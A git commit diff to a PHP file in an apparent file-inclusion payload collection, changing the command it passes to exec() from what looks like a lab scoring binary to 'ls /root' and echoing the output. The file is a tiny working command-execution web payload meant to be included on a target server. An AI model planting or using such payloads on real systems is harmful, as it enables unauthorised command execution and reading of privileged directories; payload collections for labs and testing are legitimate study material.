7c63f47a3e6bea75cadcc1829b458c0e07ee66e9
Paulo Mota <44026675+paulogmota@users.noreply.github.com>
2023-05-16 21:09:48 -0300

    Update commandExecution.php

--- file-inclusion-payloads/commandExecution.php
+++ file-inclusion-payloads/commandExecution.php
@@ -1,5 +1,5 @@
 <?php
-    $command = '/usr/local/bin/score daee4bbb-30f5-4c24-abf7-f5eeddc7b891';
+    $command = 'ls /root';
     $output = exec($command);
     // Print the output
     echo $output;
